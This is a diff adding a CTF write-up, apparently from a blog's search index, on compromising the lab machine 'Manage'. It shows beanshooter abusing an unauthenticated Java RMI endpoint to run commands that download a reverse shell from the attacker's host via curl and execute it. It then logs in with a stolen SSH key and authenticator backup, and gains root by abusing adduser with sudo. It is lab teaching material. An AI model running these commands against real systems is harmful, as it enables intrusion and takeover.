@@ -565,4 +565,48 @@ $ evil-winrm -i 10.10.10.149 -u administrator -p &lt;SNIP&gt;Evil-WinRM shell v3
         <tag>ProcDump</tag>
       </tags>
   </entry>
+  <entry>
+    <title>Manage (Linux Easy)</title>
+    <url>/2025/04/25/Manage/</url>
+    <content><![CDATA[Manage is a Linux Easy machine starting off with Java RMI using beanshooter. After enumeration we see we gather credentials and that authorization on the Remote MBean server isn’t required. Using this we are able to get a foothold on the machine. As user tomcat, we see other users we can attack in /etc/passwd. Trying to escalate our privilege to useradmin we have password reuse from the credentials we gathered, but upon entering the password were asked for verification. Looking in useradmin‘s home we see a backup tar file. Getting it to our machine yields this users home directory backed up. We have a ssh key we can use to get on the box, along with .google_authenticator having PINS to try. Doing so gets us sshed on the box. Looking at our users privilege, we see we have ALL:ALL on /usr/sbin/adduser. Looking at a typical sudoers file we see we can use admin as a user, as this group is not present on the box. Upon adding this user, they will in turn be added to the admin group allowing just ALL:ALL, which gives us root.
+Initial NmapPORT     STATE SERVICE  REASON         VERSION22/tcp   open  ssh      syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   256 a9:36:3d:1d:43:62:bd:b3:88:5e:37:b1:fa:bb:87:64 (ECDSA)                              | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL/6LNCGTwX42XmhwON6uF7gkwKfdO4iIzYnFD87dWpXiPrNIYgfW0953r40u4j4DAf+PhgdmdKKKE8KIifQaVc=|   256 da:3b:11:08:81:43:2f:4c:25:42:ae:9b:7f:8c:57:98 (ED25519)                            |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGbGFCw+4cyYAXrdHnPXp2K1ojZhTcQrXPI+pDFW5vkh          2222/tcp open  java-rmi syn-ack ttl 63 Java RMI                                             | rmi-dumpregistry:                                                                         |   jmxrmi                                                                                  |     javax.management.remote.rmi.RMIServerImpl_Stub                                        |     @127.0.1.1:38941                        |     extends                                                                               |       java.rmi.server.RemoteStub                                                          |       extends                                                                             |_        java.rmi.server.RemoteObject                                                      |_ssh-hostkey: ERROR: Script execution failed (use -d to debug)                              8080/tcp open  http     syn-ack ttl 63 Apache Tomcat 10.1.19                                 |_http-favicon: Apache Tomcat                  |_http-title: Apache Tomcat/10.1.19            | http-methods:                                                                             |_  Supported Methods: GET HEAD POST OPTIONS   Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Looking at port 2222 specifically. 👀
+Java RMI (Remote Method Invocation) and our footHold 👌Java RMI(Remote Method Invocation) is a Java API that allows an object running in one JVM (Java Virtual Machine) to invoke methods on an object running in another JVM, even if they’re on different physical machines. RMI provides a mechanism for Java-based distributed computing. We can abuse this with beanshooter.
+
+We can first run some enumeration.
+$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar enum 10.10.124.240 2222[+] Checking available bound names:[+][+]     * jmxrmi (JMX endpoint: 127.0.1.1:38941)[+][+] Checking for unauthorized access:[+][+]     - Remote MBean server does not require authentication.[+]       Vulnerability Status: Vulnerable[+][+] Checking pre-auth deserialization behavior:[+][+]     - Remote MBeanServer rejected the payload class.[+]       Vulnerability Status: Non Vulnerable   &lt;SNIP&gt;[+] Enumerating tomcat users:[+][+]     - Listing 2 tomcat users:[+][+]             ----------------------------------------[+]             Username:  manager[+]             Password:  &lt;SNIP&gt;[+]             Roles:[+]                        Users:type=Role,rolename=&quot;manage-gui&quot;,database=UserDatabase[+][+]             ----------------------------------------[+]             Username:  admin[+]             Password:  &lt;SNIP&gt;[+]             Roles:[+]                        Users:type=Role,rolename=&quot;role1&quot;,database=UserDatabas                     
+
+Now we have some credentials. But lets try to get a shell. First we can create a reverse shell and put it in x and host it. This will grab our shell.
+$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar standard 10.10.124.240 2222 exec &#x27;curl -o /tmp/x 10.8.4.29/x&#x27;
+
+This the executes our shell.
+$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar standard 10.10.124.240 2222 exec &#x27;bash /tmp/x&#x27;
+
+Our foothold appears 🙌
+$ nc -lvnp 9001listening on [any] 9001 ...connect to [10.8.4.29] from (UNKNOWN) [10.10.124.240] 57806bash: cannot set terminal process group (597): Inappropriate ioctl for devicebash: no job control in this shelltomcat@manage:/$ ididuid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)tomcat@manage:/$ 
+
+
+I’m just a regular TomcatAs tomcat we look around seeing we have to users we can look at. Going to /home we can see a directory backup in useradmin‘s home directory. This has a backup.tar.gz we can extract to our machine. 
+$ tomcat@manage:/home/useradmin/backups$ lslsbackup.tar.gz
+I just base64 encoded and the decoded on my machine. After that we had some directories, including .ssh. Using the key we can ssh in as useradmin, but upon entering the password it asks for verification.
+$ ssh -i .ssh/id_ed25519 useradmin@10.10.124.240(useradmin@10.10.124.240) Verification code:
+We also had a .google_authenticator file. This held PINS we can use for verification, and after using one or two we get in.
+$ ssh -i .ssh/id_ed25519 useradmin@10.10.124.240(useradmin@10.10.124.240) Verification code: Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-112-generic x86_64)Last login: Sat Apr 26 00:29:41 2025 from 10.8.4.29useradmin@manage:~$ iduid=1002(useradmin) gid=1002(useradmin) groups=1002(useradmin)
+
+PrivEscIf we look at our privileges we have adduser, trying everything such as appending to the end i.e. --uid 0 or --system didn’t yield any results. Yet if we look we groups there wasn’t an admin, a typical sudoers file looks like the following:
+# User privilege specificationroot	ALL=(ALL:ALL) ALL# Members of the admin group may gain root privileges%admin ALL=(ALL) ALL# Allow members of group sudo to execute any command%sudo	ALL=(ALL:ALL) ALL
+So in theory if we add a user named admin then groups follow when a new user is added. So adding user admin would give us the permissions ALL=(ALL) ALL. That gets us root.
+useradmin@manage:~$ su adminPassword: admin@manage:/home/useradmin$ sudo -l[sudo] password for admin: Matching Defaults entries for admin on manage:    env_reset, timestamp_timeout=1440, mail_badpass,    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_ptyUser admin may run the following commands on manage:    (ALL) ALLadmin@manage:/home/useradmin$ sudo suroot@manage:/home/useradmin# iduid=0(root) gid=0(root) groups=0(root)
+
+
+]]></content>
+      <categories>
+        <category>vl</category>
+      </categories>
+      <tags>
+        <tag>Java RMI</tag>
+        <tag>TomCat</tag>
+        <tag>Sudo Abuse</tag>
+      </tags>
+  </entry>
 </search>
